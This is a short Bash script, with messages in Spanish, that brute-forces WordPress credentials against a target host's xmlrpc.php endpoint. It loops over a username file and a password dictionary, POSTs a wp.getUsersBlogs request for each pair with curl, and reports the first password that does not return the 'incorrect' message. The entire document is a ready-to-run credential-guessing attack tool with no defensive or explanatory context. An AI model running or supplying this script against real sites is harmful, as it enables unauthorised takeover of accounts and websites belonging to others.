#!/bin/bash

if [[ -z $@ ]]; then
	echo -e "\n\tUso: $0 <host> <diccionario>"
	exit 1
fi

host="$1"
diccionario="$2"

function ctrl_c(){
	echo -e "\n[!] Saliendo. . .\n"
	exit 1

}

trap ctrl_c INT

declare -r xmlrpc_url="$host/xmlrpc.php"
declare -r data_xml_file="data.xml"

function borrar_arch(){
	rm $data_xml_file 2>/dev/null
}

for username in $(cat usuarios-wp.txt); do



    for password in $(cat $diccionario); do

cat << EOF > $data_xml_file
<methodCall>
	<methodName>wp.getUsersBlogs</methodName>
	<params>
		<param><value>$username</value></param>
		<param><value>$password</value></param>
	</params>
</methodCall>
EOF

        echo "Probando $username:$password. . ."
	    curl -s $xmlrpc_url -X POST -d @$data_xml_file | grep "incorrectos" &> /dev/null

	    if [ "$(echo $?)" != 1 ]; then
		    echo -e "\n[+] La contraseña es $password\n"
		    borrar_arch
		    exit 0;
	    fi
	    borrar_arch

    done;

done;
